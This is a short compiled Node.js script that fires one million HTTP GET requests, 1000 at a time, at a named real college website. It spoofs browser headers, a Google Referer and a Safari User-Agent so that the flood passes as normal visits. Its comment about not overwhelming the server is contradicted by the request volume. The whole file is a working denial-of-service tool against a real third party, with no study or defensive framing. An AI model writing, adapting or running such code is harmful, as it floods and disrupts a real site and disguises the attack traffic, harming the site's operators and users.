"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
let config = {
    method: 'get',
    maxBodyLength: Infinity,
    url: 'https://www.tcetmumbai.in/',
    headers: {
        'Referer': 'https://www.google.com/',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15',
        'api-key': process.env.API_KEY, // Use environment variable for sensitive data
    },
};
// Function to execute 1000 requests and wait for all to finish
function sendBulkRequests() {
    return __awaiter(this, void 0, void 0, function* () {
        for (let i = 0; i < 1000000; i += 1000) {
            console.log(`Batch ${i / 1000 + 1}: Sending 1000 requests...`);
            // Create an array of 1000 promises
            const requests = [];
            for (let j = 0; j < 1000; j++) {
                requests.push(axios_1.default.request(config));
            }
            try {
                // Wait for all requests in this batch to complete
                yield Promise.all(requests);
                console.log(`Batch ${i / 1000 + 1} complete.`);
            }
            catch (error) {
                // Check if the error is an instance of Error and log its message
                if (error instanceof Error) {
                    console.error(`Error in batch ${i / 1000 + 1}:`, error.message);
                }
                else {
                    console.error(`Error in batch ${i / 1000 + 1}:`, error);
                }
            }
            // Add a delay between batches to avoid overwhelming the server
            yield delay(1000); // Delay of 1 second between batches
        }
    });
}
// Helper function to introduce delay
function delay(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}
sendBulkRequests();
